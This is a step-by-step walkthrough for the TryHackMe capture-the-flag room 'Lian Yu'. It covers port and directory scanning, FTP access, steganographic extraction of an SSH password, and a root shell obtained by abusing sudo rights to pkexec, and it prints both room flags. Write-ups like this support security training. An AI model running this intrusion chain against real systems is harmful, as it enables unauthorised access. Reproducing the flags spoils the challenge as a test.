# 🏝️ Lian Yu – TryHackMe Walkthrough

![Banner](https://i.imgur.com/your-banner-image.png)

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Type](https://img.shields.io/badge/Type-CTF-blue)
![Focus](https://img.shields.io/badge/Focus-Enumeration%20%7C%20Steganography%20%7C%20PrivEsc-purple)

---

## 🧠 Overview

Lian Yu is a TryHackMe CTF inspired by *Arrow (Deathstroke / Slade Wilson storyline)*.  
This machine focuses on:

- Enumeration  
- Hidden directories  
- Steganography  
- Credential harvesting  
- Privilege escalation  

---

# 🔎 STEP 1: Reconnaissance

## 🔍 Nmap Scan

Run a full scan to identify open ports and services:

```bash
nmap -sC -sV -A 10.48.137.137
📌 Results
21/tcp – FTP (vsftpd 3.0.2)
22/tcp – SSH (OpenSSH 6.7p1)
80/tcp – HTTP (Apache – “Purgatory”)
111/tcp – rpcbind

👉 Key takeaway:
We have FTP + Web + SSH → initial access likely via FTP or web enumeration.

🌐 STEP 2: Web Enumeration
🔧 Gobuster Scan
gobuster dir -u http://10.48.137.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
📌 Findings
/island
/server-status (403 Forbidden)

👉 We focus on /island.

🌐 STEP 3: Deep Web Enumeration
🔍 Directory Found
/island/2100
📄 Hidden File
/green_arrow.ticket

👉 Hint: number 2100 becomes important later.

📂 STEP 4: FTP Enumeration
🔐 Login to FTP
ftp 10.48.165.72
Credentials:
Username: vigilante
Password: (provided/derived during challenge)
📁 Files Found
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
.other_user
📥 Download Files
mget *
🕵️ STEP 5: Hidden File Analysis
📄 Read Hidden File
cat .other_user
🧠 Result

Lore about Slade Wilson (Deathstroke).

👉 Hint: username for SSH = slade

🧩 STEP 6: Steganography Extraction
🖼️ Extract Hidden Data
steghide --extract -sf aa.jpg
📦 Output
ss.zip
📂 Unzip File
unzip ss.zip
📁 Extracted Files
passwd.txt
shado
🔍 Check Password File
cat shado
🧠 Result
M3tahuman

👉 SSH password discovered.

🔑 STEP 7: SSH Login
ssh slade@10.48.137.137
Password:
M3tahuman

✔ Successful login as user slade

👤 STEP 8: User Flag
cat user.txt
🏁 Flag:
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
⚙️ STEP 9: Privilege Escalation
🔍 Check sudo permissions
sudo -l
📌 Result:
(root) PASSWD: /usr/bin/pkexec
💥 Exploit
sudo -u root /usr/bin/pkexec /bin/bash

✔ Root shell obtained

👑 STEP 10: Root Flag
cat root.txt
🏁 Flag:
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
🧾 SUMMARY
🛠️ Skills Used
Nmap scanning
Gobuster enumeration
FTP exploitation
Hidden file discovery
Steganography (steghide)
SSH access
Privilege escalation (pkexec abuse)
💬 CONCLUSION

This machine demonstrates that:

Small hints = big breakthroughs
Hidden files are critical
Steganography is often key
Misconfigured sudo = full system compromise
